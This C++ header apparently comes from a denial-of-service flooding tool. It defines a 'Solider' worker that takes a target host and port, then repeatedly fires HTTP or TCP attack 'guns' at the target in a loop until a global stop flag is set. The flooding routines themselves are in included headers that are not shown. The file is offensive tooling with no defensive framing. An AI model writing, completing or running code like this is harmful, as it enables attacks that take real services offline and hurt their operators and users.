#ifndef SOLIDER_H
#define SOLIDER_H

#include "api_interface.h"
#include "globals.h"
#include "http_gun.h"
#include "tcp_gun.h"

class Solider
{
public:
	explicit Solider(Informator::AttackMethod method, const std::string &target, int port=0) : 
		m_method{method},
		m_target{target},
		m_port{port}
	{}

	void operator()()
	{
		switch (m_method)
		{
			case Informator::AttackMethod::HTTPAttack:
			{
				Attackers::HTTPGun http;
				while(!g_shouldStop.load())
				{
					http.FireTillDead({m_target, 0});
				}
				break;
			}
			case Informator::AttackMethod::TCPAttack:
			{
				Attackers::TCPGun tcp;
				Attackers::Target target{m_target, m_port};

				while(!g_shouldStop.load())
				{
					tcp.FireWithoutProxy(target);
				}
				break;
			}
			case Informator::AttackMethod::UDPAttack:
			{
				throw std::runtime_error("Not implemented");
			}
		}
	}
private:
	Informator::AttackMethod m_method;
	std::string m_target;
	int m_port;
};

#endif // SOLIDER_H
